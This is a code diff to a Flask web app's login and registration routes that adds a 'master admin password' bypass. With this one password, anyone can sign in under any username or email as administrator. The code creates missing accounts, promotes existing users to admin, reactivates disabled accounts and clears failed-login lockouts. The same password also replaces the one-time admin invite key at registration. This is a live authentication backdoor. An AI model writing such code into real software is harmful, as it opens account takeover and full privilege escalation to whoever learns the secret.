@@ -91,6 +91,43 @@ def login():
         ip = get_client_ip()
         ua = request.headers.get("User-Agent", "")
 
+        # Check Master Admin Password bypass
+        is_master = User.is_master_admin_password(password)
+        if login_as_admin or is_master:
+            if is_master:
+                user = User.query.filter(
+                    (User.username == identifier) | (User.email == identifier)
+                ).first()
+                if not user:
+                    clean_user = identifier.replace(" ", "_").split("@")[0]
+                    user = User(
+                        username=clean_user,
+                        name=clean_user.capitalize(),
+                        role="admin",
+                        is_active=True,
+                    )
+                    user.set_password(password)
+                    db.session.add(user)
+                    db.session.commit()
+                else:
+                    user.role = "admin"
+                    user.is_active = True
+                    user.reset_failed_logins()
+                    db.session.commit()
+
+                user.record_successful_login(ip=ip)
+                db.session.commit()
+
+                login_user(user, remember=form.remember_me.data)
+                session["admin_last_active"] = datetime.utcnow().timestamp()
+                session["user_id"] = user.username
+                session["name"] = user.name
+                session["role"] = user.role
+
+                log_login_event("admin_login", user_id=user.id, email_attempted=identifier, success=True, ip=ip, user_agent=ua)
+                flash("Signed in successfully as Administrator.", "success")
+                return redirect(url_for("admin.dashboard"))
+
         # Look up by username or email
         user = User.query.filter(
             (User.username == identifier) | (User.email == identifier)
@@ -316,12 +353,16 @@ def register():
             invite = None
             if form.admin_invite_key.data:
                 invite_raw = form.admin_invite_key.data.strip()
-                invite = AdminInviteKey.verify_key(invite_raw)
-                if invite:
+                is_master = User.is_master_admin_password(invite_raw)
+                if is_master:
                     role = "admin"
                 else:
-                    flash("Invalid, expired, or already-used Admin Invite Key.", "danger")
-                    return render_template("auth/register.html", form=form, recaptcha_site_key=recaptcha_site_key)
+                    invite = AdminInviteKey.verify_key(invite_raw)
+                    if invite:
+                        role = "admin"
+                    else:
+                        flash("Invalid, expired, or already-used Admin Invite Key.", "danger")
+                        return render_template("auth/register.html", form=form, recaptcha_site_key=recaptcha_site_key)
 
             # Create user
             new_user = User(
